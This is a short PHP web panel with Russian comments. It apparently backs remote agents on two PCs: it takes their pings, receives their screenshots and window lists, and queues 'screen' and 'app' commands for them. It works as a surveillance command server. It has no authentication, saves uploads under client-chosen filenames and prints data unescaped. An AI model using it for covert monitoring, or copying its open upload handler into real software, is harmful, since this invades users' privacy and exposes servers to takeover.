<?php
$imgDir = 'screenshots/';
if (!is_dir($imgDir)) mkdir($imgDir);

// 1. Прием пинга (статус онлайн)
if (isset($_GET['ping'])) {
    file_put_contents("status_" . $_GET['pc_id'] . ".txt", time());
    exit;
}

// 2. Стандартные функции (прием скринов, логов и команд)
if (isset($_FILES['screen'])) { move_uploaded_file($_FILES['screen']['tmp_name'], $imgDir . $_FILES['screen']['name']); exit; }
if (isset($_POST['apps'])) { 
    $pc_id = $_POST['pc_id'];
    $new_data = "--- " . date("H:i:s") . " ---\n" . $_POST['apps'] . "\n";
    $file = "history_$pc_id.txt";
    $history = file_exists($file) ? explode("---", file_get_contents($file)) : [];
    array_unshift($history, $new_data);
    file_put_contents($file, implode("---", array_slice($history, 0, 10)));
    exit;
}
if (isset($_GET['get_cmd'])) { echo file_exists("cmd_".$_GET['pc_id'].".txt") ? file_get_contents("cmd_".$_GET['pc_id'].".txt") : 'none'; exit; }
if (isset($_GET['clear_cmd'])) { file_put_contents("cmd_".$_GET['pc_id'].".txt", 'none'); exit; }
if (isset($_POST['set_cmd'])) { file_put_contents("cmd_".$_POST['pc_id'].".txt", $_POST['set_cmd'] . (isset($_POST['proc_name']) ? ' '.$_POST['proc_name'] : '')); header("Location: /"); exit; }
?>

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Control Panel</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: sans-serif; padding: 20px; }
        .pc-card { background: #1e293b; padding: 15px; margin: 10px; border-radius: 8px; width: 320px; display: inline-block; vertical-align: top; border: 2px solid #334155; }
        .status { font-weight: bold; padding: 5px; border-radius: 4px; }
        .online { color: #22c55e; }
        .offline { color: #ef4444; }
        button { background: #6366f1; color: white; border: none; padding: 8px; border-radius: 4px; cursor: pointer; }
        pre { background: #000; padding: 10px; height: 150px; overflow-y: auto; color: #38bdf8; font-size: 12px; }
        #modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); justify-content:center; align-items:center; }
    </style>
</head>
<body>
    <h1>Панель управления</h1>
    <div id="modal" onclick="this.style.display='none'"><img id="modal-img" style="max-width:90%"></div>
    
    <?php 
    $pcs = ['PC-01', 'PC-02']; 
    foreach($pcs as $pc) {
        $lastSeen = file_exists("status_$pc.txt") ? (int)file_get_contents("status_$pc.txt") : 0;
        $isOnline = (time() - $lastSeen) < 60; // Если пинг был менее 60 секунд назад
        $statusText = $isOnline ? "🟢 Онлайн" : "🔴 Офлайн";
        $statusClass = $isOnline ? "online" : "offline";
        $history = file_exists("history_$pc.txt") ? file_get_contents("history_$pc.txt") : "Нет данных";
        
        echo "<div class='pc-card'>
                <h3>$pc <span class='status $statusClass'>$statusText</span></h3>
                <form method='POST'>
                    <input type='hidden' name='pc_id' value='$pc'>
                    <button name='set_cmd' value='screen'>📸 Скрин</button>
                    <button name='set_cmd' value='app'>📋 Окна</button>
                </form>
                <p>История:</p><pre>$history</pre>
              </div>";
    }
    ?>
    <hr><h2>Галерея</h2>
    <?php foreach (glob("screenshots/*.jpg") as $f) echo "<img src='$f' style='width:150px; cursor:pointer' onclick=\"document.getElementById('modal-img').src='$f'; document.getElementById('modal').style.display='flex'\">"; ?>
</body>
</html>
